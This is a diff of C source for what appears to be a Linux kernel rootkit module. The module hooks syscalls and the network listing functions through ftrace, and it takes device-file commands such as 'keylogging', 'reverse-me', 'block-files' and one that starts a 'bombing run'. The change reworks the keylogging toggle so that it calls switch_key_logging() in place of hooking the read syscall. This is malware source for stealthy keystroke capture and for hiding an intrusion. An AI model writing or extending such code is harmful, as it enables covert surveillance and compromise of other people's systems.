@@ -33,7 +33,7 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
     HOOK("__x64_sys_openat", hack_openat, &orig_openat),
     HOOK("__x64_sys_pread64", hack_pread64, &orig_pread64),
     HOOK("__x64_sys_statx", hack_statx, &orig_statx),
-    HOOK("__x64_sys_read", hack_read, &orig_read),
+    //HOOK("__x64_sys_read", hack_read, &orig_read),
     HOOK("__x64_sys_execve", hack_execve, &orig_execve),
     HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
@@ -48,7 +48,7 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
     HOOK("sys_getdents64", hack_getdents64, &orig_getdents64),
     HOOK("sys_getdents", hack_getdents, &orig_getdents),
     HOOK("sys_kill", hack_kill, &orig_kill),
-    HOOK("sys_read", hack_read, &orig_read),
+    //HOOK("sys_read", hack_read, &orig_read),
     HOOK("sys_reboot", hack_reboot, &orig_reboot),
     HOOK("sys_openat", hack_openat, &orig_openat),
     HOOK("sys_pread64", hack_pread64, &orig_pread64),
@@ -228,15 +228,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         }
     }
 
-    if(memcmp("keylogging", tmpdata, strlen("keylogging")) == 0){
-        if(strlen(tmpdata) == strlen("keylogging")){
-            strcpy(last_data, tmpdata);
-            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_read") == 1){
-                pr_err("error hooking syscall read\n");
-            }
-        }
-    }
-
     if(memcmp("block-files", tmpdata, strlen("block-files")) == 0){
         if(strlen(tmpdata) == strlen("block-files")){
             strcpy(last_data, tmpdata);
@@ -270,15 +261,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_statx") == 1){
                 pr_err("error hooking syscall statx\n");
-            }
-        }
-    }
-
-    if(memcmp("keylogging", tmpdata, strlen("keylogging")) == 0){
-        if(strlen(tmpdata) == strlen("keylogging")){
-            strcpy(last_data, tmpdata);
-            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
-                pr_err("error hooking syscall read\n");
             }
         }
     }
@@ -336,7 +318,6 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             }
         }
     }
-
 
     if(memcmp("reverse-me", tmpdata, strlen("reverse-me")) == 0){
         if(strlen(tmpdata) == strlen("reverse-me")){
@@ -398,10 +379,17 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             start_bombing_run();
         }
     }
+
+    if(memcmp("keylogging", tmpdata, strlen("keylogging")) == 0){
+        if(strlen(tmpdata) == strlen("keylogging")){
+            strcpy(last_data, tmpdata);
+            switch_key_logging();
+        }
+    }
+
     pr_info("User Sent: %s\n", tmpdata);
     return 0;
 }
-
 
 struct file_operations fops = { // file operations on device file, what functions to call when reading/writing
     read: reader,
